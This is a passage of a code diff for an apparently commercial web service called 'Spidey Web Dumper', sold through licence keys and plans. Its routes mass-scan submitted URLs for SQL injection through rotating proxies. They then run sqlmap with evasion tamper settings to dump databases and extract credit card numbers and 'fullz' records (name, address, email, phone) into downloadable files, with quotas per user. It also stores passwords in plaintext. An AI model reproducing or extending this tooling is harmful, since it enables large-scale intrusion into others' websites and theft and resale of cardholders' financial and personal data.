+            "dead": len(proxies) - len(live_list),
+        })
+        update_progress(tid, done=len(proxies), total=len(proxies),
+                        live=len(live_list), msg="Done!")
+        add_log(tid, f"Live: {len(live_list)} / {len(proxies)}")
+    except Exception as e:
+        logger.exception(f"[proxy_check] {e}")
+        update_task(tid, status="error", error=str(e))
+
+
+@app.post("/api/proxy/clear")
+async def api_proxy_clear(request: Request):
+    uid = require_user(request)
+    save_user_proxies(uid, [])
+    save_last_response(uid, "proxy_clear", {"cleared": True})
+    return {"ok": True, "total": 0}
+
+
+@app.post("/api/proxy/remove")
+async def api_proxy_remove(
+    request: Request,
+    proxies: str = Form(...),
+):
+    uid = require_user(request)
+    to_remove = set(p.strip() for p in proxies.splitlines() if p.strip())
+    current = get_user_proxies(uid)
+    new = [p for p in current if p not in to_remove]
+    removed = len(current) - len(new)
+    save_user_proxies(uid, new)
+    save_last_response(uid, "proxy_remove", {"removed": removed, "total": len(new)})
+    return {"ok": True, "removed": removed, "total": len(new)}
+
+
+@app.get("/api/proxy/list")
+async def api_proxy_list(request: Request):
+    uid = require_user(request)
+    proxies = get_user_proxies(uid)
+    return {"ok": True, "proxies": proxies, "count": len(proxies)}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — SQLI SCANNER
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.post("/api/sqli/scan")
+async def api_sqli_scan(
+    request: Request,
+    urls: str = Form(...),
+):
+    uid = require_user(request)
+    url_list = [u.strip() for u in urls.splitlines()
+                if u.strip().startswith(("http://", "https://"))]
+    if not url_list:
+        return JSONResponse({"error": "No valid URLs"}, status_code=400)
+    if len(url_list) > 200_000:
+        url_list = url_list[:200_000]
+
+    allowed, remaining = check_quota(uid, "sqli", len(url_list))
+    if not allowed:
+        return JSONResponse(
+            {"error": f"Quota exceeded. Remaining: {remaining}"},
+            status_code=429
+        )
+
+    tid = new_task(uid, "sqli", {"total": len(url_list)})
+    asyncio.create_task(_run_sqli(tid, uid, url_list))
+    return {"task_id": tid}
+
+
+async def _run_sqli(tid: str, uid: str, urls: List[str]):
+    try:
+        update_task(tid, status="running")
+        update_progress(tid, total=len(urls), msg="Scanning URLs...")
+        add_log(tid, f"Testing {len(urls)} URLs")
+
+        proxies = get_user_proxies(uid)
+        add_log(tid, f"Using {len(proxies)} proxies")
+
+        from core.sqli import _check_injectable
+        import aiohttp
+
+        inj = []
+        sem = asyncio.Semaphore(80)
+        last_edit = [0.0]
+        connector = aiohttp.TCPConnector(limit=200, ssl=False)
+
+        async with aiohttp.ClientSession(connector=connector) as session:
+            async def _test(url):
+                if not url:
+                    return
+                async with sem:
+                    import random
+                    px = random.choice(proxies) if proxies else ""
+                    try:
+                        if await _check_injectable(session, url, px):
+                            inj.append(url)
+                            add_log(tid, f"🎯 VULN: {url[:80]}")
+                    except Exception:
+                        pass
+
+            BATCH = 500
+            for i in range(0, len(urls), BATCH):
+                batch = urls[i:i + BATCH]
+                await asyncio.gather(*[_test(u) for u in batch],
+                                      return_exceptions=True)
+
+                now = time.time()
+                if now - last_edit[0] > 1.2:
+                    last_edit[0] = now
+                    done = min(i + BATCH, len(urls))
+                    update_progress(
+                        tid,
+                        done=done, total=len(urls), found=len(inj),
+                        msg=f"Tested {done}/{len(urls)} | VULN {len(inj)}",
+                    )
+
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        fname = save_output(uid, f"vuln_{len(inj)}_{ts}.txt", "\n".join(inj))
+
+        consume_quota(uid, "sqli", len(urls))
+        save_last_response(uid, "sqli", {
+            "tested": len(urls),
+            "vuln": len(inj),
+            "file": fname,
+        })
+
+        update_task(tid, status="done", result={
+            "tested": len(urls),
+            "vuln": len(inj),
+            "file": fname,
+        })
+        update_progress(tid, done=len(urls), total=len(urls),
+                        found=len(inj), msg="Done!")
+        add_log(tid, f"Found {len(inj)} vulnerable URLs")
+    except Exception as e:
+        logger.exception(f"[sqli] {e}")
+        update_task(tid, status="error", error=str(e))
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — SQLMAP DUMP
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.post("/api/dump/run")
+async def api_dump_run(
+    request: Request,
+    urls: str = Form(...),
+    level: int = Form(3),
+    risk: int = Form(2),
+    threads: int = Form(10),
+    technique: str = Form("BEUSTQ"),
+    tamper: str = Form("space2comment,between,charencode"),
+    crawl: int = Form(0),
+):
+    uid = require_user(request)
+    url_list = [u.strip() for u in urls.splitlines()
+                if u.strip().startswith(("http://", "https://"))]
+    if not url_list:
+        return JSONResponse({"error": "No valid URLs"}, status_code=400)
+    if len(url_list) > 5000:
+        url_list = url_list[:5000]
+
+    allowed, remaining = check_quota(uid, "dumps", len(url_list))
+    if not allowed:
+        return JSONResponse(
+            {"error": f"Quota exceeded. Remaining: {remaining}"},
+            status_code=429
+        )
+
+    # Validate sqlmap settings
+    level = max(1, min(5, level))
+    risk = max(1, min(3, risk))
+    threads = max(1, min(50, threads))
+    crawl = max(0, min(5, crawl))
+
+    tid = new_task(uid, "dump", {
+        "total": len(url_list),
+        "level": level, "risk": risk, "threads": threads,
+    })
+    asyncio.create_task(_run_dump(
+        tid, uid, url_list,
+        level, risk, threads, technique, tamper, crawl,
+    ))
+    return {"task_id": tid}
+
+
+async def _run_dump(
+    tid: str, uid: str, urls: List[str],
+    level: int, risk: int, threads: int,
+    technique: str, tamper: str, crawl: int,
+):
+    try:
+        update_task(tid, status="running")
+        update_progress(tid, total=len(urls), msg="Starting sqlmap...")
+        add_log(tid, f"Targets: {len(urls)} URLs")
+
+        proxies = get_user_proxies(uid)
+        add_log(tid, f"Using {len(proxies)} proxies")
+
+        from core.sqlmap_api import api_dump_multiple
+        from core.fullz import (
+            extract_fullz_from_dir, extract_fullz_from_csv,
+            _extract_cards_from_csv_dir,
+        )
+
+        all_cards = set()
+        all_fullz = []
+        done_count = [0]
+        last_edit = [0.0]
+
+        async def on_prog(done, total, success):
+            now = time.time()
+            if now - last_edit[0] < 1.5:
+                return
+            last_edit[0] = now
+            update_progress(
+                tid,
+                done=done, total=total,
+                cards=len(all_cards), fullz=len(all_fullz),
+                msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}",
+            )
+
+        async def on_result(r, zip_bytes):
+            done_count[0] += 1
+            # Collect cards
+            if r.cards:
+                for c in r.cards:
+                    all_cards.add(c)
+            # Collect fullz
+            try:
+                src = r.csv_dir or ""
+                if src and os.path.isdir(src):
+                    recs = extract_fullz_from_dir(src)
+                    if recs:
+                        all_fullz.extend(recs)
+            except Exception:
+                pass
+            add_log(tid, f"✅ {r.url[:60]} | CC: {len(r.cards)}")
+
+        await api_dump_multiple(
+            urls,
+            proxy_list=proxies,
+            level=level, risk=risk,
+            technique=technique, threads=threads, tamper=tamper,
+            crawl_depth=crawl,
+            progress_cb=on_prog,
+            per_result_cb=on_result,
+        )
+
+        # Save results
+        all_cards = list(all_cards)
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        result = {}
+
+        if all_cards:
+            cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt",
+                                  "\n".join(all_cards))
+            result["cards_file"] = cc_name
+            result["cards"] = len(all_cards)
+            consume_quota(uid, "cards", len(all_cards))
+
+        if all_fullz:
+            # Dedup
+            seen = set()
+            dedup = []
+            for rec in all_fullz:
+                key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
+                if key in seen:
+                    continue
+                seen.add(key)
+                dedup.append(rec)
+
+            from core.fullz import fullz_records_to_lines
+            rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
+            if rich:
+                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt",
+                                      "\n".join(fullz_records_to_lines(rich, "full")))
+                result["fullz_file"] = fz_name
+                result["fullz"] = len(rich)
+                consume_quota(uid, "fullz", len(rich))
+
+        consume_quota(uid, "dumps", len(urls))
+        save_last_response(uid, "dump", {
+            "tested": len(urls),
+            "cards": result.get("cards", 0),
+            "fullz": result.get("fullz", 0),
+            "cards_file": result.get("cards_file", ""),
+            "fullz_file": result.get("fullz_file", ""),
+        })
+
+        update_task(tid, status="done", result=result)
+        update_progress(tid, done=len(urls), total=len(urls),
+                        cards=result.get("cards", 0),
+                        fullz=result.get("fullz", 0),
+                        msg="Done!")
+        add_log(tid, f"Dump complete. CC: {result.get('cards', 0)}, Fullz: {result.get('fullz', 0)}")
+    except Exception as e:
+        logger.exception(f"[dump] {e}")
+        update_task(tid, status="error", error=str(e))        
+        
+        
+        
+# ═══════════════════════════════════════════════════════════════════════════
+#  API — TASK STATUS (for live polling)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/api/task/{tid}")
+async def api_task_status(request: Request, tid: str):
+    uid = require_user(request)
+    t = get_task(tid)
+    if not t:
+        raise HTTPException(status_code=404, detail="Task not found")
+    if t["uid"] != uid:
+        user = get_user(uid)
+        if not user or not user.get("is_admin"):
+            raise HTTPException(status_code=403, detail="Not your task")
+    return t
+
+
+@app.post("/api/task/{tid}/cancel")
+async def api_task_cancel(request: Request, tid: str):
+    uid = require_user(request)
+    t = get_task(tid)
+    if not t or t["uid"] != uid:
+        raise HTTPException(status_code=404, detail="Task not found")
+    update_task(tid, status="cancelled")
+    return {"ok": True}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — DOWNLOAD
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/download/{fname}")
+async def download_file(request: Request, fname: str):
+    uid = require_user(request)
+    fname = safe_filename(fname)
+    fpath = os.path.join(OUTPUT_DIR, fname)
+    if not os.path.isfile(fpath):
+        raise HTTPException(status_code=404, detail="File not found")
+
+    # Permission: user must own file OR be admin
+    user = get_user(uid)
+    is_admin = user and user.get("is_admin")
+    if not is_admin and not fname.startswith(uid[:8] + "_"):
+        raise HTTPException(status_code=403, detail="Access denied")
+
+    return FileResponse(
+        fpath,
+        filename=fname,
+        media_type="text/plain",
+    )
+
+
+@app.post("/api/files/delete")
+async def api_files_delete(request: Request, fname: str = Form(...)):
+    uid = require_user(request)
+    user = get_user(uid)
+    is_admin = user and user.get("is_admin")
+    fname = safe_filename(fname)
+    if not is_admin and not fname.startswith(uid[:8] + "_"):
+        return JSONResponse({"error": "Access denied"}, status_code=403)
+    fpath = os.path.join(OUTPUT_DIR, fname)
+    if os.path.isfile(fpath):
+        try:
+            os.remove(fpath)
+            return {"ok": True}
+        except Exception as e:
+            return JSONResponse({"error": str(e)}, status_code=500)
+    return JSONResponse({"error": "Not found"}, status_code=404)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — SETTINGS
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/settings", response_class=HTMLResponse)
+async def settings_page(request: Request):
+    uid = require_user(request)
+    user = get_user(uid)
+    return templates.TemplateResponse("settings.html", {
+        "request": request,
+        "uid": uid,
+        "user": user,
+        "sqlmap_defaults": {
+            "level": 3, "risk": 2, "threads": 10,
+            "technique": "BEUSTQ",
+            "tamper": "space2comment,between,charencode",
+            "crawl": 0,
+        },
+    })
+
+
+@app.post("/api/settings/password")
+async def api_settings_password(
+    request: Request,
+    old_password: str = Form(...),
+    new_password: str = Form(...),
+):
+    uid = require_user(request)
+    users = load_users()
+    if uid not in users:
+        return JSONResponse({"error": "User not found"}, status_code=404)
+    if users[uid].get("password") != old_password:
+        return JSONResponse({"error": "Old password wrong"}, status_code=400)
+    if len(new_password) < 4:
+        return JSONResponse({"error": "Password too short"}, status_code=400)
+    users[uid]["password"] = new_password
+    save_users(users)
+    return {"ok": True}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — PROFILE
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/profile", response_class=HTMLResponse)
+async def profile_page(request: Request):
+    uid = require_user(request)
+    user = get_user(uid)
+    last_all = get_last_response(uid)
+    return templates.TemplateResponse("profile.html", {
+        "request": request,
+        "uid": uid,
+        "user": user,
+        "last": last_all,
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — PLANS / BILLING
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/plans", response_class=HTMLResponse)
+async def plans_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("plans.html", {
+        "request": request,
+        "uid": uid,
+        "plans": PLANS,
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — HELP
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/help", response_class=HTMLResponse)
+async def help_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("help.html", {
+        "request": request, "uid": uid,
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — LOGS
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/logs", response_class=HTMLResponse)
+async def logs_page(request: Request):
+    uid = require_user(request)
+    # Show all active tasks for this user
+    user_tasks = [t for t in TASKS.values() if t["uid"] == uid]
+    user_tasks.sort(key=lambda x: x["started"], reverse=True)
+    return templates.TemplateResponse("logs.html", {
+        "request": request, "uid": uid,
+        "tasks": user_tasks[:50],
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — ADMIN
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/admin", response_class=HTMLResponse)
+async def admin_panel(request: Request):
+    uid = require_admin(request)
+    users = load_users()
+    keys = load_keys()
+    active_users = sum(1 for u in users.values()
+                       if u.get("expires") and u.get("expires") > datetime.now().isoformat())
+    return templates.TemplateResponse("admin.html", {
+        "request": request,
+        "uid": uid,
+        "total_users": len(users),
+        "active_users": active_users,
+        "total_keys": len(keys),
+        "plans": PLANS,
+    })
+
+
+@app.get("/admin/keys", response_class=HTMLResponse)
+async def admin_keys(request: Request, msg: str = None):
+    uid = require_admin(request)
+    keys = load_keys()
+    # Sort by created date (latest first)
+    items = sorted(keys.items(),
+                   key=lambda x: x[1].get("created", ""),
+                   reverse=True)
+    return templates.TemplateResponse("admin_keys.html", {
+        "request": request, "uid": uid,
+        "keys": items, "msg": msg,
+        "plans": PLANS,
+    })
+
+
+@app.post("/admin/keys/generate")
+async def admin_keys_generate(
+    request: Request,
+    plan: str = Form(...),
+    count: int = Form(1),
+):
+    uid = require_admin(request)
+    if plan not in PLANS:
+        return RedirectResponse("/admin/keys?msg=Invalid+plan", status_code=302)
+    count = max(1, min(100, count))
+
+    keys = load_keys()
+    new_keys = []
+    for _ in range(count):
+        k = generate_license_key()
+        while k in keys:
+            k = generate_license_key()
+        keys[k] = {
+            "plan": plan,
+            "label": PLANS[plan]["label"],
+            "created": datetime.now().isoformat(),
+            "created_by": uid,
+            "used_by": None,
+        }
+        new_keys.append(k)
+    save_keys(keys)
+    return RedirectResponse(f"/admin/keys?msg=Generated+{count}+keys", status_code=302)
+
+
+@app.post("/admin/keys/revoke")
+async def admin_keys_revoke(
+    request: Request,
+    key: str = Form(...),
+):
+    uid = require_admin(request)
+    keys = load_keys()
+    if key in keys:
+        del keys[key]
+        save_keys(keys)
+        return RedirectResponse("/admin/keys?msg=Revoked", status_code=302)
+    return RedirectResponse("/admin/keys?msg=Key+not+found", status_code=302)
+
+
+@app.get("/admin/users", response_class=HTMLResponse)
+async def admin_users(request: Request, msg: str = None):
+    uid = require_admin(request)
+    users = load_users()
+    items = sorted(users.items(), key=lambda x: x[1].get("created", ""), reverse=True)
+    return templates.TemplateResponse("admin_users.html", {
+        "request": request, "uid": uid,
+        "users": items, "msg": msg,
+    })
+
+
+@app.post("/admin/users/delete")
+async def admin_users_delete(
+    request: Request,
+    username: str = Form(...),
+):
+    uid = require_admin(request)
+    if username == ADMIN_USERNAME:
+        return RedirectResponse("/admin/users?msg=Cannot+delete+admin", status_code=302)
+    users = load_users()
+    if username in users:
+        del users[username]
+        save_users(users)
+        return RedirectResponse("/admin/users?msg=Deleted", status_code=302)
+    return RedirectResponse("/admin/users?msg=Not+found", status_code=302)
+
+
+@app.post("/admin/users/extend")
+async def admin_users_extend(
+    request: Request,
+    username: str = Form(...),
+    plan: str = Form(...),
+):
+    uid = require_admin(request)
+    if plan not in PLANS:
+        return RedirectResponse("/admin/users?msg=Invalid+plan", status_code=302)
+    users = load_users()
+    if username not in users:
+        return RedirectResponse("/admin/users?msg=User+not+found", status_code=302)
+    plan_data = PLANS[plan]
+    base = datetime.now()
+    cur_exp = users[username].get("expires")
+    if cur_exp:
+        try:
+            cur_dt = datetime.fromisoformat(cur_exp)
+            if cur_dt > base:
+                base = cur_dt
+        except Exception:
+            pass
+    users[username]["expires"] = (base + plan_data["delta"]).isoformat()
+    users[username]["plan"] = plan
+    users[username]["plan_label"] = plan_data["label"]
+    save_users(users)
+    return RedirectResponse("/admin/users?msg=Extended", status_code=302)
+
+
+@app.post("/admin/users/reset_password")
+async def admin_users_reset(
+    request: Request,
+    username: str = Form(...),
+    new_password: str = Form(...),
+):
+    uid = require_admin(request)
+    users = load_users()
+    if username not in users:
+        return RedirectResponse("/admin/users?msg=Not+found", status_code=302)
+    if len(new_password) < 4:
+        return RedirectResponse("/admin/users?msg=Password+too+short", status_code=302)
+    users[username]["password"] = new_password
+    save_users(users)
+    return RedirectResponse("/admin/users?msg=Password+reset", status_code=302)
+
+
+@app.post("/admin/users/clear_usage")
+async def admin_users_clear_usage(
+    request: Request,
+    username: str = Form(...),
+):
+    uid = require_admin(request)
+    users = load_users()
+    if username not in users:
+        return RedirectResponse("/admin/users?msg=Not+found", status_code=302)
+    users[username]["usage"] = {
+        "keywords": 0, "dorks": 0, "urls": 0,
+        "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0,
+    }
+    save_users(users)
+    return RedirectResponse("/admin/users?msg=Usage+cleared", status_code=302)
+
+
+@app.get("/admin/broadcast", response_class=HTMLResponse)
+async def admin_broadcast_page(request: Request, msg: str = None):
+    uid = require_admin(request)
+    users = load_users()
+    return templates.TemplateResponse("admin_broadcast.html", {
+        "request": request, "uid": uid,
+        "total_users": len(users), "msg": msg,
+    })
+
+
+@app.post("/admin/broadcast/send")
+async def admin_broadcast_send(
+    request: Request,
+    subject: str = Form(...),
+    message: str = Form(...),
+):
+    uid = require_admin(request)
+    # Save to file (users will see on next login)
+    bcast_file = os.path.join(DATA_DIR, "broadcast.json")
+    _save_json(bcast_file, {
+        "subject": subject,
+        "message": message,
+        "sent_at": datetime.now().isoformat(),
+        "sent_by": uid,
+    })
+    return RedirectResponse("/admin/broadcast?msg=Broadcast+sent", status_code=302)
+
+
+@app.get("/admin/stats", response_class=HTMLResponse)
+async def admin_stats(request: Request):
+    uid = require_admin(request)
+    users = load_users()
+    keys = load_keys()
+    try:
+        import psutil
+        proc = psutil.Process()
+        mem = proc.memory_info().rss / 1024 / 1024
+        cpu = psutil.cpu_percent(interval=0.1)
+        mem_str = f"{mem:.1f} MB"
+        cpu_str = f"{cpu:.1f}%"
+    except Exception:
+        mem_str = "N/A"
+        cpu_str = "N/A"
+
+    import platform
+    stats = {
+        "total_users": len(users),
+        "active_users": sum(
+            1 for u in users.values()
+            if u.get("expires") and u.get("expires") > datetime.now().isoformat()
+        ),
+        "total_keys": len(keys),
+        "used_keys": sum(1 for k in keys.values() if k.get("used_by")),
+        "free_keys": sum(1 for k in keys.values() if not k.get("used_by")),
+        "active_tasks": len(TASKS),
+        "mem": mem_str,
+        "cpu": cpu_str,
+        "python": platform.python_version(),
+        "os": platform.system(),
+    }
+    return templates.TemplateResponse("admin_stats.html", {
+        "request": request, "uid": uid, "stats": stats,
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  STARTUP / SHUTDOWN
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.on_event("startup")
+async def on_startup():
+    logger.info("🕷️  Spidey Web Dumper starting...")
+    logger.info(f"📁 Data dir: {DATA_DIR}")
+    logger.info(f"📁 Output dir: {OUTPUT_DIR}")
+
+    # Ensure data files exist
+    load_users()
+    load_keys()
+
+    # Try to start sqlmapapi (async)
+    try:
+        from core.sqlmap_api import ensure_api_server
+        asyncio.create_task(ensure_api_server())
+        logger.info("🔧 sqlmapapi starting in background...")
+    except Exception as e:
+        logger.warning(f"sqlmapapi start failed: {e}")
+
+    # Cleanup old tasks periodically
+    async def _cleaner():
+        while True:
+            await asyncio.sleep(600)  # every 10 min
+            try:
+                cleanup_old_tasks(max_age_hours=6)
+            except Exception:
+                pass
+    asyncio.create_task(_cleaner())
+
+    logger.info("✅ Spidey Web Dumper ready")
+
+
+@app.on_event("shutdown")
+async def on_shutdown():
+    logger.info("🕷️  Spidey shutting down...")
+    try:
+        from core.sqlmap_api import stop_api_server
+        stop_api_server()
+    except Exception:
+        pass
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  HEALTH CHECK (for Railway)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/health")
+async def health():
+    return {
+        "status": "ok",
+        "time": datetime.now().isoformat(),
+        "tasks": len(TASKS),
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  MAIN
+# ═══════════════════════════════════════════════════════════════════════════
+
+if __name__ == "__main__":
+    import uvicorn
+    port = int(os.environ.get("PORT", 8080))
+    host = os.environ.get("HOST", "0.0.0.0")
+    logger.info(f"🚀 Starting on {host}:{port}")
+    uvicorn.run(
+        "web.main:app",
+        host=host,
+        port=port,
+        reload=False,
+        log_level="info",
+    )        
+        
